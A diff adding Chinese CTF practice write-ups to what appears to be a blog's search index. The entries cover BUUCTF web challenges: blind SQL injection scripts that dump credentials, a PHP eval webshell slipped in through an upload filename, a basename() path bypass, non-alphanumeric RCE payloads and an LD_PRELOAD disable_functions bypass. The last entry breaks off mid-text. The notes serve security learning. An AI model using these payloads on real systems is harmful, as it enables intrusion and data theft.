@@ -4,6 +4,369 @@
   
     
     <entry>
+      <title>日常练习36</title>
+      <link href="%E7%BB%83%E4%B9%A0/undefined-undefined.html"/>
+      <url>%E7%BB%83%E4%B9%A0/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日常练习35——二次注入前瞻关于addslashes()函数</title>
+      <link href="test84/undefined-undefined.html"/>
+      <url>test84/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>这道题算是给二次注入开头了，因为它涉及了二次注入中一个重要的函数——addslashes()函数。  </p><h1 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h1><p>这是前年国赛总决赛的一题，重点考察了addslashes()函数的利用。  </p><p>打开题目，看到一个登陆界面：</p><p><a href="https://pic.imgdb.cn/item/60a86a5a6ae4f77d358e18f8.png"><img src="https://pic.imgdb.cn/item/60a86a5a6ae4f77d358e18f8.png"></a>  </p><p>测试后发现图片有两张不同的回显，大致就可以判断这道题和盲注有关了，接着我们可以在robots.txt里找到这道题目的提示（比赛中对于这些细节还是要检查的）   </p><p><a href="https://pic.imgdb.cn/item/60a9d26835c5199ba783de65.png"><img src="https://pic.imgdb.cn/item/60a9d26835c5199ba783de65.png"></a>  </p><p>可以看到提示我们有备份文件，我们可以下载得到image.php.bak文件，里面包含源码：  </p><pre><code>&lt;﻿?phpinclude &quot;config.php&quot;;$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id=&#39;&#123;$id&#125;&#39; or path=&#39;&#123;$path&#125;&#39;&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path);  </code></pre><p>源码审计一下，首先以get方式传参id和path，然后这两个参数要经过addslashes()函数，随后对这两个经过变化的参数进行正则匹配，替换掉一些字符。最终将这两个经过变换的变量拼接到sql语句中进行查询。  </p><p>这里最重要的就是这个addslashes()函数，我们需要知道他是干什么的：  </p><pre><code>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。预定义字符是：单引号（’）双引号（&quot;）反斜杠（\）NULL    </code></pre><p>也就是说如果我们传入的字符串中有上面的预定义字符，那么经过这个函数后就会在这些字符前面加上转义字符”&quot;。   </p><p>比如下面的代码  </p><pre><code>&lt;?php$id = &quot;\\0&quot;;echo $id.&#39;&lt;br&gt;&#39;;$id = addslashes($id);echo $id.&#39;&lt;br&gt;&#39;;$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);echo $id;?&gt;  </code></pre><p>返回的字符分别是   </p><pre><code>\0\\0\  </code></pre><p>也就是说\0在经过addslashes()函数后被加上\变为\0，然后经过正则匹配\0被替换成空，最终也就变成了\。  </p><p>但是如果这个转义字符被拼接到sql语句中会发生什么呢？  </p><pre><code>select * from images where id=&#39;\&#39; or path=&#39;&#123;$path&#125;&#39;  </code></pre><p>可以看到转义字符后面的单引号会被转义，原来的闭合单引号往后顺延，那么最终id的值为：&#39; or path=，也就是说原来关于path的查询不存在了，现在只剩下关于id的值的查询。  </p><p>但是我们仍然可以上传变量path来进行拼接，又因为这道题的查询回显页面不同，没有回显结果，所以我们可以使用盲注来查询。  </p><p>payload语句如下：  </p><pre><code>?id=\\0&amp;path=or 1=if(length(database())&gt;1,1,-1)#  </code></pre><p>这样最终的sql查询语句实际上是：  </p><p>select * from images where id=’<strong>&#39; or path=</strong> or 1=if(length(database())&gt;1,1,-1)’#<br>（加粗的字符是id的值）  </p><p>很明显的盲注，测试后发现确实会有不同的回显。  </p><p>接下来就是上脚本来得到用户名和密码了:  </p><pre><code>import requestsurl = &#39;http://ac4c87f5-3044-4096-b55a-0c647ae76c50.node3.buuoj.cn/image.php?id=\\0&amp;path=or 1=&#39;flag = &#39;&#39;table_name = &#39;&#39;for i in range(1, 50):for c in range(127, 0, -1):    payload = &#39;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() ),%d,1))=%d,1,-1)%%23&#39; % (i, c)    #payload = &#39;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 ),%d,1))=%d,1,-1)%%23&#39; % (i, c)    #payload = &#39;if(ascii(substr((select group_concat(username) from users),%d,1))=%d,1,-1)%%23&#39; % (i, c)    #payload = &#39;if(ascii(substr((select group_concat(password) from users),%d,1))=%d,1,-1)%%23&#39; % (i, c)    r = requests.get(url+payload)    if &quot;JFIF&quot; in r.text:        table_name += chr(c)        print(table_name)        break</code></pre><p>得到密码和用户名：  </p><p><a href="https://pic.imgdb.cn/item/60a9df3135c5199ba7efdfdb.png"><img src="https://pic.imgdb.cn/item/60a9df3135c5199ba7efdfdb.png"></a></p><p>登录，发现是一个上传文件的页面：  </p><p>直接抓包上传一句话木马试试。  </p><p><a href="https://pic.imgdb.cn/item/60a9dfb335c5199ba7f53744.png"><img src="https://pic.imgdb.cn/item/60a9dfb335c5199ba7f53744.png"></a>  </p><p>告诉我们将文件名记录在日志中，那么我们尝试通过文件名写入一句话木马。  </p><p>修改Content-Disposition中参数filename的值为<?php @eval($_POST['cmd']) ?>  </p><p><a href="https://pic.imgdb.cn/item/60a9e02735c5199ba7f9dfdf.png"><img src="https://pic.imgdb.cn/item/60a9e02735c5199ba7f9dfdf.png"></a>  </p><p>又说不让上传php文件，应该是我们的文件名中有php字符，那么我们使用短标签绕过  </p><p>我们这样构造：  </p><pre><code>&lt;?= @eval($_POST[&#39;cmd&#39;]); ?&gt;  </code></pre><p>成功上传，接下来就是蚁剑链接了：  </p><p><a href="https://pic.imgdb.cn/item/60a9e11d35c5199ba7032905.png"><img src="https://pic.imgdb.cn/item/60a9e11d35c5199ba7032905.png"></a>  </p><p>根目录得到flag。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题重点就是addslashes()函数的操作，如何构造字符来利用addslashes()函数和下面的正则匹配来成功执行sql盲注，之后的二次注入也将和他有关，此外就是关于上传文件的文件名一句话木马和短标签绕过这两个小知识点。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test84 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日常练习34——关于$ _SERVER[&#39;PH _SELF&#39;])和basename函数</title>
+      <link href="test83/undefined-undefined.html"/>
+      <url>test83/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>这道题是一个关于一个php函数和新的变量属性的新知识点，积累一下。  </p><h1 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h1><p>打开题目，发现让我们猜东西，猜到才能给flag，并且提供了源码。我们先审计源码：  </p><pre><code>&lt;?phpinclude &#39;config.php&#39;; // FLAG is defined in config.phpif (preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);&#125;if (isset($_GET[&#39;source&#39;])) &#123;  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));  exit();&#125;$secret = bin2hex(random_bytes(64));if (isset($_POST[&#39;guess&#39;])) &#123;  $guess = (string) $_POST[&#39;guess&#39;];  if (hash_equals($secret, $guess)) &#123;$message = &#39;Congratulations! The flag is: &#39; . FLAG;&#125; else &#123;$message = &#39;Wrong.&#39;;  &#125;&#125;  </code></pre><p>可以看到让我猜东西的代码如下：  </p><pre><code>$secret = bin2hex(random_bytes(64));if (isset($_POST[&#39;guess&#39;])) &#123;  $guess = (string) $_POST[&#39;guess&#39;];  if (hash_equals($secret, $guess)) &#123;$message = &#39;Congratulations! The flag is: &#39; . FLAG;&#125; else &#123;$message = &#39;Wrong.&#39;;  &#125;&#125;  </code></pre><p>这里random_bytes( int $length)函数是生成指定大小的随机字符串（单位：字节），然后bin2hex()函数将生成的ASCII字符串转换为16进制，它让我们猜的就是这一串十六进制字符。且对比时采用了php 可防止时序攻击的字符串比较函数 hash _equals()。也就是说明，我们不可能在猜字符串这里下手脚了，猜是猜不到的。  </p><p>那么我们就重点放在前面的代码：  </p><pre><code>include &#39;config.php&#39;; // FLAG is defined in config.phpif (preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);&#125;if (isset($_GET[&#39;source&#39;])) &#123;  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));  exit();&#125;  </code></pre><p>这段代码中有两个之前没见过的重要信息：  </p><p>第一个是属性$ _SERVER[‘PHP _SELF’]，这个表示当前 php 文件相对于网站根目录的位置地址，与 document root 相关，如下图的测试：  </p><p><a href="https://pic.imgdb.cn/item/60a681e26ae4f77d35fcf609.png"><img src="https://pic.imgdb.cn/item/60a681e26ae4f77d35fcf609.png"></a>  </p><p>第二个就是basename()函数，这个函数会返回路径中的文件名部分假如路径是/index.php/config.php，浏览器的解析结果都是index.php，而basename会返回config.php，就算后面跟上多余的字符也会返回文件名部分，比如test.php/?source仍会返回文件名test.php。  </p><p>而basename()函数存在一个问题，那就是他会去掉文件名开头的非ASCII值，比如下面两个例子：  </p><pre><code>var_dump(basename(&quot;xffconfig.php&quot;)); // =&gt; config.phpvar_dump(basename(&quot;config.php/xff&quot;)); // =&gt; config.php</code></pre><p>在代码的一开头就已经告诉我们了flag在config.php里，如果我们想要读取到这个文件，就要get上传参数source，并且我们的路径里的文件名必须是config.php。</p><pre><code>if (isset($_GET[&#39;source&#39;])) &#123;  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));  exit();&#125;  </code></pre><p>但是一开始就有一个正则匹配：  </p><pre><code>if (preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);&#125;</code></pre><p>我们观察这个匹配，/config.php/*$/i表示匹配的是字符串尾部，对config.php这个字符进行匹配，匹配的字符串是文件路径，那也就是说，我们不能直接上传payload的文件路径为：</p><pre><code>/index.php/config.php/?source  </code></pre><p>因为这样会被直接过滤，那么我们可以利用basename()函数会去掉文件名开头的非ASCII值这一漏洞，这样构造：  </p><pre><code>/index.php/config.php/%ff?source  </code></pre><p>这里的%ff就是非ASCII值，这样构造的payload既满足了有变量source上传，能够执行读取文件的代码，又能成功返回正确的文件名config.php(因为%ff会被去掉，?source不会影响返回文件名)，最重要的是绕过了正则匹配，因为它会匹配的是**%ff?source**这一段，从而绕过了对config.php的匹配。  </p><p><a href="https://pic.imgdb.cn/item/60a6927d6ae4f77d35a5304c.png"><img src="https://pic.imgdb.cn/item/60a6927d6ae4f77d35a5304c.png"></a>  </p><p>得到config.php的内容。  </p><p>下面附上关于fuzz脚本，用来测试那些字符不会被过滤，同时构造满足条件的payload：  </p><pre><code>import requestsimport refor i in range(0,255):url =&#39;http://cc5b962c-30fd-4564-a182-23f81878af5a.node3.buuoj.cn/index.php/config.php/&#123;&#125;?source&#39;.format(chr(i))print(url)r = requests.get(url)flag = re.findall(&quot;flag\&#123;.*?\&#125;&quot;, r.text)if flag:    print(flag)    break</code></pre><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题就是两个关于php的新知识，比较重要的就是basename()函数的一些问题，当作积累就好了。  </p><p>附上basename()函数的漏洞官网：  </p><p><a href="https://bugs.php.net/bug.php?id=62119">basename()函数</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test83 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日常练习33——盲注脚本</title>
+      <link href="test82/undefined-undefined.html"/>
+      <url>test82/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>做了一道经典的盲注题目，积累一个这种类型盲注的脚本。  </p><h1 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h1><p>进入题目发现是查询成绩的界面：  </p><p><a href="https://pic.imgdb.cn/item/60a3ca8b6ae4f77d35de35c5.png"><img src="https://pic.imgdb.cn/item/60a3ca8b6ae4f77d35de35c5.png"></a>  </p><p>我们分别输入1，2，3知道5都是有回显的，后面的学号就没有回显了，我们输入1^1^1和1^2^1来测试是否存在盲注。  </p><p>发现回显不同并成功返回，说明存在盲注，而这个只过滤了空格，这里用括号代替，接下来就是上脚本。  </p><pre><code># -*- coding: utf-8 -*-# @Author: jiaoben# @Date  :  2020/05/03import reimport requestsimport stringurl = &quot;http://f2301815-d05c-45da-a70a-91600495a2c2.node3.buuoj.cn/&quot;flag = &#39;&#39;def payload(i, j):# 数据库名字# sql = &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)# 表名# sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#39;ctf&#39;),%d,1))&gt;%d)^1&quot;%(i,j)# 列名# sql = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),%d,1))&gt;%d)^1&quot;%(i,j)# 查询flagsql = &quot;1^(ord(substr((select(group_concat(value))from(ctf.flag)),%d,1))&gt;%d)^1&quot; % (i, j)data = &#123;&quot;stunum&quot;: sql&#125; //这里修改注入的idr = requests.get(url, params=data)# print (r.url)if &quot;Hi admin, your score is: 100&quot; in r.text:    res = 1else:    res = 0return resdef exp():global flagfor i in range(1, 10000):    print(i, &#39;:&#39;)    low = 32    high = 128    while low &lt;= high:        mid = (low + high) // 2        res = payload(i, mid)        if res:            low = mid + 1        else:            high = mid - 1    f = int((low + high +1)) // 2    if (f == 132 or f == 32):        break    # print (f)    flag += chr(f)    print(flag)exp()print(&#39;flag=&#39;, flag)</code></pre><p>直接就能得到flag。  </p><p>下面附上找到的网上的另一个比较全的python脚本  </p><pre><code># -*- coding:utf-8 -*-# Author: mochu7import requestsdef ascii_str():#生成库名表名字符所在的字符列表字典str_list=[]for i in range(33,127):#所有可显示字符    str_list.append(chr(i))#print(&#39;可显示字符：%s&#39;%str_list)return str_list#返回字符列表def db_length(url,str):print(&quot;[-]开始测试数据库名长度.......&quot;)num=1while True:    db_payload=url+&quot;&#39; and (length(database())=%d)--+&quot;%num    r=requests.get(db_payload)    if str in r.text:        db_length=num        print(&quot;[+]数据库长度：%d\n&quot;%db_length)        db_name(db_length)#进行下一步，测试库名        break    else:        num += 1def db_name(db_length):print(&quot;[-]开始测试数据库名.......&quot;)db_name=&#39;&#39;str_list=ascii_str()for i in range(1,db_length+1):    for j in str_list:        db_payload=url+&quot;&#39; and (ord(mid(database(),%d,1))=&#39;%s&#39;)--+&quot;%(i,ord(j))        r=requests.get(db_payload)        if str in r.text:            db_name+=j            breakprint(&quot;[+]数据库名：%s\n&quot;%db_name)tb_piece(db_name)#进行下一步，测试security数据库有几张表return db_namedef tb_piece(db_name):print(&quot;开始测试%s数据库有几张表........&quot;%db_name)for i in range(100):#猜解库中有多少张表，合理范围即可    tb_payload=url+&quot;&#39; and %d=(select count(table_name) from information_schema.tables where table_schema=&#39;%s&#39;)--+&quot;%(i,db_name)    r=requests.get(tb_payload)    if str in r.text:        tb_piece=i        breakprint(&quot;[+]%s库一共有%d张表\n&quot;%(db_name,tb_piece))tb_name(db_name,tb_piece)#进行下一步，猜解表名def tb_name(db_name,tb_piece):print(&quot;[-]开始猜解表名.......&quot;)table_list=[]for i in range(tb_piece):    str_list=ascii_str()    tb_length=0    tb_name=&#39;&#39;    for j in range(1,20):#表名长度，合理范围即可        tb_payload=url+&quot;&#39; and (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d--+&quot;%(i,j)        r=requests.get(tb_payload)        if str in r.text:            tb_length=j            print(&quot;第%d张表名长度：%s&quot;%(i+1,tb_length))            for k in range(1,tb_length+1):#根据表名长度进行截取对比                for l in str_list:                    tb_payload=url+&quot;&#39; and (select ord(mid((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)))=%d--+&quot;%(i,k,ord(l))                    r=requests.get(tb_payload)                    if str in r.text:                        tb_name+=l            print(&quot;[+]：%s&quot;%tb_name)            table_list.append(tb_name)            breakprint(&quot;\n[+]%s库下的%s张表：%s\n&quot;%(db_name,tb_piece,table_list))column_num(table_list,db_name)#进行下一步，猜解每张表的字段数def column_num(table_list,db_name):print(&quot;[-]开始猜解每张表的字段数：.......&quot;)column_num_list=[]for i in table_list:    for j in range(30):#每张表的字段数量，合理范围即可        column_payload=url+&quot;&#39; and %d=(select count(column_name) from information_schema.columns where table_name=&#39;%s&#39;)--+&quot;%(j,i)        r=requests.get(column_payload)        if str in r.text:            column_num=j            column_num_list.append(column_num)#把所有表的字段，依次放入这个列表当中            print(&quot;[+]%s表\t%s个字段&quot;%(i,column_num))            breakprint(&quot;\n[+]表对应的字段数：%s\n&quot;%column_num_list)column_name(table_list,column_num_list,db_name)#进行下一步，猜解每张表的字段名def column_name(table_list,column_num_list,db_name):print(&quot;[-]开始猜解每张表的字段名.......&quot;)column_length=[]str_list=ascii_str()column_name_list=[]for t in range(len(table_list)):#t在这里代表每张表的列表索引位置    print(&quot;\n[+]%s表的字段：&quot;%table_list[t])    for i in range(column_num_list[t]):#i表示每张表的字段数量        column_name=&#39;&#39;        for j in range(1,21):#j表示每个字段的长度            column_name_length=url+&quot;&#39; and %d=(select length(column_name) from information_schema.columns where table_name=&#39;%s&#39; limit %d,1)--+&quot;%(j-1,table_list[t],i)            r=requests.get(column_name_length)            if str in r.text:                column_length.append(j)                break            for k in str_list:#k表示我们猜解的字符字典                column_payload=url+&quot;&#39; and ord(mid((select column_name from information_schema.columns where table_name=&#39;%s&#39; limit %d,1),%d,1))=%d--+&quot;%(table_list[t],i,j,ord(k))                r=requests.get(column_payload)                if str in r.text:                    column_name+=k        print(&#39;[+]：%s&#39;%column_name)        column_name_list.append(column_name)#print(column_name_list)#输出所有表中的字段名到一个列表中dump_data(table_list,column_name_list,db_name)#进行最后一步，输出指定字段的数据def dump_data(table_list,column_name_list,db_name):print(&quot;\n[-]对%s表的%s字段进行爆破.......\n&quot;%(table_list[3],column_name_list[9:12]))str_list=ascii_str()for i in column_name_list[9:12]:#id,username,password字段    for j in range(101):#j表示有多少条数据，合理范围即可        data_num_payload=url+&quot;&#39; and (select count(%s) from %s.%s)=%d--+&quot;%(i,db_name,table_list[3],j)        r=requests.get(data_num_payload)        if str in r.text:            data_num=j            break    print(&quot;\n[+]%s表中的%s字段有以下%s条数据：&quot;%(table_list[3],i,data_num))    for k in range(data_num):        data_len=0        dump_data=&#39;&#39;        for l in range(1,21):#l表示每条数据的长度，合理范围即可            data_len_payload=url+&quot;&#39; and ascii(substr((select %s from %s.%s limit %d,1),%d,1))--+&quot;%(i,db_name,table_list[3],k,l)            r=requests.get(data_len_payload)            if str not in r.text:                data_len=l-1                for x in range(1,data_len+1):#x表示每条数据的实际范围，作为mid截取的范围                    for y in str_list:                        data_payload=url+&quot;&#39; and ord(mid((select %s from %s.%s limit %d,1),%d,1))=%d--+&quot;%(i,db_name,table_list[3],k,x,ord(y))                        r=requests.get(data_payload)                        if str in r.text:                            dump_data+=y                            break                break        print(&#39;[+]%s&#39;%dump_data)#输出每条数据if __name__ == &#39;__main__&#39;:url=&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;#目标urlstr=&quot;You are in&quot;#布尔型盲注的true&amp;false的判断因素db_length(url,str)#程序入口</code></pre><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>一般的盲注题目，也没有过滤什么，有脚本就很简单。  </p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test82 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日常练习32</title>
+      <link href="test81/undefined-undefined.html"/>
+      <url>test81/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>这道题是一个rce的绕过题。  </p><h1 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h1><p>关于rce的绕过感觉还是重在积累，网上有很多博客都有讲各种rce的绕过，比如什么无参数绕过，无字母数字绕过等等，下次有时间整理一下。  </p><p>这道题目直接给了源码，  </p><pre><code>&lt;?phperror_reporting(0);if(isset($_GET[&#39;code&#39;]))&#123;        $code=$_GET[&#39;code&#39;];                if(strlen($code)&gt;40)&#123;                                    die(&quot;This is too Long.&quot;);                                            &#125;                if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;                                    die(&quot;NO.&quot;);                                            &#125;                @eval($code);&#125;else&#123;        highlight_file(__FILE__);&#125;// ?&gt;  </code></pre><p>很明显就是无字母和数字的rce绕过，这个网上都有讲解。这里简单说一下，对于不同版本的php有不同的方法来绕过字母和数字的过滤，可以取反或者异或绕过，如果这些不行还可以通过上传文件来用通配符绕过，这道题用取反绕过即可。  </p><p>先执行一下phpinfo()试一试：  </p><pre><code>?code=(~%8F%97%8F%96%91%99%90)();  </code></pre><p>发现成功执行，那么接下来就好办了。我们直接构造一个一句话木马连一下：  </p><pre><code>&lt;?php error_reporting(0);$a=&#39;assert&#39;;$b=urlencode(~$a);echo $b;echo &quot;&lt;br&gt;&quot;;$c=&#39;(eval($_POST[cmd]))&#39;;$d=urlencode(~$c);echo $d; ?&gt;   </code></pre><p>得到取反后的payload：  </p><pre><code>?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6);  </code></pre><p><a href="https://pic.imgdb.cn/item/609e97f8d1a9ae528f66fefd.png"><img src="https://pic.imgdb.cn/item/609e97f8d1a9ae528f66fefd.png"></a>  </p><p>成功连上，接下来就是上蚁剑。  </p><p>用蚁剑连上后却发现打开readflag文件是乱码，原来是开启了disable_functions，禁用了很多函数，导致我们的shell无法生效，那么我们就需要绕过这个disable _functions的限制，这里有两种方法。  </p><h2 id="利用蚁剑的插件"><a href="#利用蚁剑的插件" class="headerlink" title="利用蚁剑的插件"></a>利用蚁剑的插件</h2><p>蚁剑的有一个插件可以绕过disable_functions的限制，但是我这个蚁剑没办法下载，所以没办法使用。但是这个插件确实好用。  </p><h2 id="LD-preload-mail劫持so来执行系统命令"><a href="#LD-preload-mail劫持so来执行系统命令" class="headerlink" title="LD_preload + mail劫持so来执行系统命令"></a>LD_preload + mail劫持so来执行系统命令</h2><p>这个原理就有点复杂了，我直接讲方法，大致原理如下：  </p><pre><code>利用linux提供的LD_preload环境变量，劫持共享so，在启动子进程的时候，新的子进程会加载我们恶意的so拓展，然后我们可以在so里面定义同名函数，即可劫持API调用，成功RCE  </code></pre><h3 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h3><p>我们发现在/var/tmp/目录存在上传权限，那么我们上传我们的exp（这个是可以在GitHub上下载的）</p><p>上传下面两个文件  </p><p><a href="https://pic.imgdb.cn/item/609e9c31d1a9ae528fa98189.png"><img src="https://pic.imgdb.cn/item/609e9c31d1a9ae528fa98189.png"></a>  </p><p>然后我们就可以在网页上重新构造payload来执行命令了。  </p><pre><code>?code=$&#123;_GET&#125;[_]($&#123;_GET&#125;[_]);&amp;_=assert&amp;_=eval($_POST[&#39;a&#39;])  </code></pre><p>再加上对应的getshell文件和绕过exploit文件即为：  </p><pre><code>?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=include(%27/var/tmp/bypass_disablefunc.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/tmpfile&amp;sopath=/var/tmp/bypass_disablefunc_x64.so</code></pre><p>上传就能得到flag。  </p><p><a href="https://pic.imgdb.cn/item/609e9d52d1a9ae528fbba03d.png"><img src="https://pic.imgdb.cn/item/609e9d52d1a9ae528fbba03d.png"></a>  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题考的就是无字母数字的rce绕过，网上方法很多，其次就是关于disable _functions的绕过，这里学到了两个方法，一个是利用蚁剑上的插件，另一个就是LD _preload + mail劫持so来执行系统命令，关于第二个方法目前对于具体原理理解还不深，只知道具体步骤，有时间还是要多加深理解。  </p><p>下面附上第二种方法的exp下载和关于无字母数字rce的绕过博客：  </p><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a>  </p><p><a href="https://blog.csdn.net/weixin_45669205/article/details/115842332?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162100811916780274196600%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=162100811916780274196600&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~times_rank-4-115842332.first_rank_v2_pc_rank_v29&utm_term=%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce&spm=1018.2226.3001.4449">无字母数字RCE与LD_PRELOAD绕disable_functions</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test81 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日常练习31</title>
+      <link href="test80/undefined-undefined.html"/>
+      <url>test80/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>记两道简单题目。  </p><h1 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h1><p>这道题目直接给提示，提示我们要以admin用户登入  </p><p><a href="https://pic.imgdb.cn/item/609d42add1a9ae528f5a937a.png"><img src="https://pic.imgdb.cn/item/609d42add1a9ae528f5a937a.png"></a>  </p><p>并且提示了cookie这一信息，那么我们直接抓包看：  </p><p><a href="https://pic.imgdb.cn/item/609d4304d1a9ae528f5fed90.png"><img src="https://pic.imgdb.cn/item/609d4304d1a9ae528f5fed90.png"></a>  </p><p>发现我们上传的是username，既然题目中已经提示了cookie，那么我们就把cookie修改一下，改成：Cookie: username=admin试试。  </p><p><a href="https://pic.imgdb.cn/item/609d437ad1a9ae528f67271f.png"><img src="https://pic.imgdb.cn/item/609d437ad1a9ae528f67271f.png"></a>  </p><p>发现直接登入成功，看来就是简单考察cookie的伪造。  </p><h1 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h1><p>一张火星文图片，f12直接出结果…….  </p><p><a href="https://pic.imgdb.cn/item/609d43f6d1a9ae528f6dfe57.png"><img src="https://pic.imgdb.cn/item/609d43f6d1a9ae528f6dfe57.png"></a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test80 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>jwt和python的反序列化</title>
+      <link href="test79/undefined-undefined.html"/>
+      <url>test79/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>这道题是和python反序列化有关的一题：  </p><h1 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h1><p>打开题目，可以看到让我们买一个lv6的大会员，但是要是一页一页翻是很难找到的，所以用脚本找一下。  </p><pre><code>import requestsfor i in range(1,1000):url = &quot;http://e744a52f-9324-4429-8e29-5ec86e29d36b.node3.buuoj.cn/shop?page=&#123;&#125;&quot;url = url.format(i)print(url)r = requests.get(url)if &quot;lv6.png&quot; in r.text and r.status_code == 200:    print(&quot;find it:&quot; ,url)    break  </code></pre><p><a href="https://pic.imgdb.cn/item/6097859ad1a9ae528f1f8c10.png"><img src="https://pic.imgdb.cn/item/6097859ad1a9ae528f1f8c10.png"></a>  </p><p>发现是在181页，接下来就是跳转到这一页购买。   </p><p><a href="https://pic.imgdb.cn/item/6097861dd1a9ae528f25a486.png"><img src="https://pic.imgdb.cn/item/6097861dd1a9ae528f25a486.png"></a>  </p><p>发现明显买不起，那就抓包看一下。  </p><p><a 